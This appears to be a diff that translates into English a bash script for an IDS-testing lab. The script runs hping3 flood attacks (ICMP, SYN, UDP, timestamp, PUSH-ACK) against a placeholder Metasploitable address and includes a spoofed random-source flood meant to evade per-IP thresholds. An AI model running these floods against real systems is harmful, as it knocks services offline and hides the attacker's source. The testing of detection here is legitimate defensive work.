@@ -1,49 +1,49 @@
 #!/bin/bash
 
 # =================================================================
-# SKENARIO 03: DENIAL OF SERVICE (DoS) - ROTASI PAYLOAD
-# Strategi: 3 Level Depth (Volumetric, Protocol, Randomized)
-# Input: Menerima argumen $1 sebagai Nomor Ronde
+# SCENARIO 03: DENIAL OF SERVICE (DoS) - PAYLOAD ROTATION
+# Strategy: 3 Level Depth (Volumetric, Protocol, Randomized)
+# Input: Receives argument $1 as the Round Number
 # =================================================================
 
-# Menerima Input Nomor Ronde dari Daily Round
-ROUND=${1:-1} # Default ke ronde 1 jika kosong
+# Receive Input Round Number from Daily Round
+ROUND=${1:-1} # Default to round 1 if empty
 
-# KONFIGURASI
-TARGET_IP="192.168.x.x"   # Ganti dengan IP Metasploitable
+# CONFIGURATION
+TARGET_IP="192.168.x.x"   # Replace with your Metasploitable IP
 LOG_FILE="logs/dos_session_$(date +%F).log"
 
-# Warna untuk Tampilan Laporan
+# Colors for Report Display
 YELLOW='\033[1;33m'
 CYAN='\033[0;36m'
 NC='\033[0m' # No Color
 
 # =================================================================
-# LOGIKA ROTASI PAYLOAD (PAYLOAD DIVERSITY)
-# Mengubah Protokol & Target Port berdasarkan fase ronde
+# PAYLOAD ROTATION LOGIC (PAYLOAD DIVERSITY)
+# Changes the protocol and target port based on the round phase
 # =================================================================
 if [ "$ROUND" -le 10 ]; then
-    # --- SET A (Ronde 1-10) ---
+    # --- SET A (Round 1-10) ---
     # Level 1: ICMP Flood (Ping Flood Standard)
     OPT_L1="-1"
     DESC_L1="ICMP Flood (Smurf/Ping)"
     
-    # Level 2: SYN Flood ke Port 80 (HTTP)
+    # Level 2: SYN Flood to Port 80 (HTTP)
     OPT_L2="-S -p 80"
     DESC_L2="SYN Flood (Port 80/HTTP)"
 
 elif [ "$ROUND" -le 20 ]; then
-    # --- SET B (Ronde 11-20) ---
-    # Level 1: UDP Flood ke Port 53 (DNS)
+    # --- SET B (Round 11-20) ---
+    # Level 1: UDP Flood to Port 53 (DNS)
     OPT_L1="-2 -p 53"
     DESC_L1="UDP Flood (Port 53/DNS)"
     
-    # Level 2: SYN Flood ke Port 21 (FTP) - Ganti Target Service
+    # Level 2: SYN Flood to Port 21 (FTP) - Replace target service
     OPT_L2="-S -p 21"
     DESC_L2="SYN Flood (Port 21/FTP)"
 
 else
-    # --- SET C (Ronde 21-30) ---
+    # --- SET C (Round 21-30) ---
     # Level 1: ICMP Timestamp Flood (Type 13)
     OPT_L1="--icmp-ts"
     DESC_L1="ICMP Timestamp Flood"
@@ -53,70 +53,70 @@ else
     DESC_L2="PUSH-ACK Flood (Port 80)"
 fi
 
-echo "[+] [03_DOS] Memulai Skenario Denial of Service..."
+echo "[+] [03_DOS] Starting Denial of Service Scenario..."
 echo "[+] Target: $TARGET_IP"
-echo "[+] Mode: Ronde $ROUND ($DESC_L1 & $DESC_L2)"
-echo "[+] Waktu Mulai: $(date)"
+echo "[+] Mode: Round $ROUND ($DESC_L1 & $DESC_L2)"
+echo "[+] Start Time: $(date)"
 
 # -----------------------------------------------------------------
 # LEVEL 1: VOLUMETRIC FLOOD (BANDWIDTH)
-# Tujuan: Menguji deteksi Volumetric Attack pada protokol berbeda.
-# Teknik: Mengirim paket secepat mungkin (--flood).
+# Goal: Test detection of volumetric attacks on different protocols.
+# Technique: Send packets as fast as possible (--flood).
 # -----------------------------------------------------------------
-echo -e "${CYAN}[Level 1] Running $DESC_L1 (30 Detik)...${NC}"
+echo -e "${CYAN}[Level 1] Running $DESC_L1 (30 seconds)...${NC}"
 
-# Merekam timestamp awal
+# Record the initial timestamp
 echo "Start Flood: $(date)" > logs/dos_lvl1_r${ROUND}.txt
 
-# Simpan Command (Menggunakan variabel $OPT_L1)
+# Store command (using variable $OPT_L1)
 CMD="timeout 30 hping3 $OPT_L1 --flood $TARGET_IP"
 
-# Tampilkan Command ke Layar
+# Display the command on screen
 echo -e "${YELLOW}    [COMMAND] $CMD${NC}"
 
-# Eksekusi Command
+# Execute the command
 $CMD >> logs/dos_lvl1_r${ROUND}.txt 2>&1
-echo "    -> Selesai. (Harapan: Alert GPL Large Packet / Stream anomaly)"
+echo "    -> Completed. (Expected: GPL Large Packet / Stream anomaly alert)"
 sleep 10
 
 # -----------------------------------------------------------------
 # LEVEL 2: PROTOCOL FLOOD (TCP STATE EXHAUSTION)
-# Tujuan: Menghabiskan resource CPU/RAM target (Service Stress).
-# Teknik: Menggunakan flag dan port spesifik variabel $OPT_L2.
+# Goal: Consume the target's CPU/RAM resources (service stress).
+# Technique: Use flags and a specific port from variable $OPT_L2.
 # -----------------------------------------------------------------
-echo -e "${CYAN}[Level 2] Running $DESC_L2 (30 Detik)...${NC}"
+echo -e "${CYAN}[Level 2] Running $DESC_L2 (30 seconds)...${NC}"
 
 echo "Start Protocol Flood: $(date)" > logs/dos_lvl2_r${ROUND}.txt
 
-# Simpan Command (Menggunakan variabel $OPT_L2)
+# Store command (using variable $OPT_L2)
 CMD="timeout 30 hping3 $OPT_L2 --flood $TARGET_IP"
 
-# Tampilkan Command ke Layar
+# Display the command on screen
 echo -e "${YELLOW}    [COMMAND] $CMD${NC}"
 
-# Eksekusi Command
+# Execute the command
 $CMD >> logs/dos_lvl2_r${ROUND}.txt 2>&1
-echo "    -> Selesai. (Harapan: Alert ET DOS Potential Flood)"
+echo "    -> Completed. (Expected: ET DOS Potential Flood alert)"
 sleep 10
 
 # -----------------------------------------------------------------
 # LEVEL 3: RANDOM SOURCE ATTACK (DDoS SIMULATION)
-# Tujuan: Mengelabui Rule "Threshold per IP".
-# Teknik: Menggunakan IP Palsu Acak (--rand-source) dengan vektor L2.
+# Goal: Bypass the rule for "threshold per IP".
+# Technique: Use random fake IPs (--rand-source) with the L2 vector.
 # -----------------------------------------------------------------
 echo -e "${CYAN}[Level 3] Running Random Source DDoS (--rand-source)...${NC}"
 
 echo "Start DDoS Sim: $(date)" > logs/dos_lvl3_r${ROUND}.txt
 
-# Simpan Command (Gabungan vektor L2 + Random Source)
+# Store command (combining L2 vector + random source)
 CMD="timeout 30 hping3 $OPT_L2 --flood --rand-source $TARGET_IP"
 
-# Tampilkan Command ke Layar
+# Display the command on screen
 echo -e "${YELLOW}    [COMMAND] $CMD${NC}"
 
-# Eksekusi Command
+# Execute the command
 $CMD >> logs/dos_lvl3_r${ROUND}.txt 2>&1
-echo "    -> Selesai. (Harapan: Menguji Global Threshold IDS)"
+echo "    -> Completed. (Expected: test IDS global threshold)"
 
-echo "[+] [03_DOS] Modul Selesai pada $(date)"
+echo "[+] [03_DOS] Module Finished at $(date)"
 echo "-----------------------------------------------------------"
